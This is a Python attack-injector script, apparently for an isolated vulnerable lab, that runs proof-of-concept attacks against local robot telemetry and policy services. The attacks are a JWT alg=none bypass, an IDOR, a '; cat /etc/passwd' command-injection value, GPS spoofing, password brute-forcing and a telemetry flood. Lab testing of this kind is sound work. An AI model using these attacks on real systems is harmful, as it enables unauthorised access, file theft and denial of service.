#!/usr/bin/env python3
"""Attack injector for vulnerable lab profile — runs ONLY in isolated docker-compose.vuln.yml."""

import asyncio
import os

import httpx

INGESTION_URL = os.environ.get("INGESTION_URL", "http://localhost:8000")
POLICY_URL = os.environ.get("POLICY_URL", "http://localhost:8001")


async def jwt_alg_none_bypass(client: httpx.AsyncClient) -> None:
    """PoC: RC-001 JWT alg=none bypass."""
    token = "eyJhbGciOiJub25lI.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9."
    resp = await client.get(
        f"{INGESTION_URL}/v1/admin/config",
        headers={"Authorization": f"Bearer {token}"},
    )
    print(f"[RC-001] JWT alg=none bypass: status={resp.status_code}")


async def idor_telemetry(client: httpx.AsyncClient, token: str) -> None:
    """PoC: RC-002 IDOR on robot telemetry."""
    resp = await client.get(
        f"{INGESTION_URL}/v1/robots/robot-beta/telemetry",
        params={"robot_id": "robot-alpha"},
        headers={"Authorization": f"Bearer {token}"},
    )
    print(f"[RC-002] IDOR telemetry swap: status={resp.status_code}")


async def command_injection(client: httpx.AsyncClient, token: str) -> None:
    """PoC: RC-004 command injection via params."""
    payload = {
        "robot_id": "robot-alpha",
        "command_type": "cmd_vel",
        "linear_x": 0.5,
        "params": {"exec": "; cat /etc/passwd"},
    }
    resp = await client.post(
        f"{POLICY_URL}/v1/commands/evaluate",
        json=payload,
        headers={"Authorization": f"Bearer {token}"},
    )
    print(f"[RC-004] Command injection: approved={resp.json().get('approved')}")


async def telemetry_flood(client: httpx.AsyncClient, token: str) -> None:
    """PoC: RC-006 telemetry flood / DoS."""
    for i in range(60):
        await client.post(
            f"{INGESTION_URL}/v1/telemetry",
            json={
                "robot_id": "robot-alpha",
                "latitude": 14.6 + i * 0.01,
                "longitude": 120.98,
                "motor_rpm": 5000,
            },
            headers={"Authorization": f"Bearer {token}"},
        )
    print("[RC-006] Telemetry flood sent (60 messages)")


async def gps_spoof(client: httpx.AsyncClient, token: str) -> None:
    """PoC: RC-003 impossible GPS jump."""
    await client.post(
        f"{INGESTION_URL}/v1/telemetry",
        json={"robot_id": "robot-alpha", "latitude": 14.5995, "longitude": 120.9842},
        headers={"Authorization": f"Bearer {token}"},
    )
    await client.post(
        f"{INGESTION_URL}/v1/telemetry",
        json={"robot_id": "robot-alpha", "latitude": 40.7128, "longitude": -74.0060},
        headers={"Authorization": f"Bearer {token}"},
    )
    print("[RC-003] GPS spoof / impossible jump sent")


async def brute_force_auth(client: httpx.AsyncClient) -> None:
    """PoC: RC-005 auth brute force."""
    for i in range(6):
        await client.post(
            f"{INGESTION_URL}/v1/auth/token",
            json={"username": "admin", "password": f"wrong{i}"},
        )
    print("[RC-005] Brute force auth attempts sent")


async def main() -> None:
    print("[attack_injector] Starting offensive lab scenarios (isolated profile only)")
    await asyncio.sleep(10)
    async with httpx.AsyncClient(timeout=10) as client:
        await jwt_alg_none_bypass(client)
        token_resp = await client.post(
            f"{INGESTION_URL}/v1/auth/token",
            json={"username": "operator", "password": "operator123!"},
        )
        token = token_resp.json().get("access_token", "")
        await idor_telemetry(client, token)
        await command_injection(client, token)
        await gps_spoof(client, token)
        await brute_force_auth(client)
        await telemetry_flood(client, token)
    print("[attack_injector] All PoC scenarios executed")


if __name__ == "__main__":
    asyncio.run(main())
